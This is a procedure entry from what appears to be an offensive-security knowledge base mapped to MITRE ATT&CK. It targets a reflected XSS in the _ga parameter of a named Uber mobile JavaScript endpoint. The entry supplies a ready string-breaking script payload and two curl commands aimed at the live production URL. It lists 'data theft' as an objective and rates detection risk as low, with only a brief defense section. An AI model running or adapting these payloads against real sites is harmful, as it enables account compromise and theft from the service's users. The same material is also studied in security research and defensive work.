---
id: proc-inject-xss-ga-001
name: Inject-XSS-Payload-via-GA-Parameter
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.157Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - xss
  - reflected-xss
  - payload-injection
commands:
  - '[[commands/curl-inject-xss-payload]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Inject-XSS-Payload-via-GA-Parameter

## Summary

This procedure crafts and injects a reflected XSS payload into the _ga query parameter of Uber's mobile JavaScript endpoint, closing the double-quoted string context to enable arbitrary HTML and JavaScript insertion without escaping.

## Description

The vulnerability stems from the _ga parameter being inserted unescaped into a JavaScript string in the response from https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js. By using a payload like '_ga=asdf"}} </script><script>alert(1)</script>', attackers close the string and inject executable code. This occurs under SSL, avoiding many browser protections, and allows execution in the context of the Uber mobile app's JS loading.

## Requirements

1. Internet access to reach the Uber endpoint
2. curl or similar HTTP client
3. Basic understanding of URL encoding for payloads

## Defense

Defensive measures and detection strategies:

- Escape special characters like double quotes in query parameters before insertion into JS strings
- Implement strict CSP with no 'unsafe-inline' or wildcards
- Monitor for anomalous query parameters in access logs

## Objectives

1. Deliver XSS payload to the endpoint
2. Confirm payload reflection without sanitization
3. Enable subsequent JavaScript execution for data theft

## Instructions

### Step 1: Craft the Payload

**Context**: URL-encode the payload to close the JS string and inject a script tag.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl -s "https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf%22%7D%7D%20%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E"
```

> This sends a GET request with the encoded payload. The response will reflect the unescaped injection, confirming the vulnerability.

### Step 2: Inspect Response

**Context**: Verify the payload appears in the JS response.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl -s "https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf%22%7D%7D%20%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E" | grep -i "alert(1)"
```

> Expected output includes the injected script, indicating successful injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[payload-injection]]
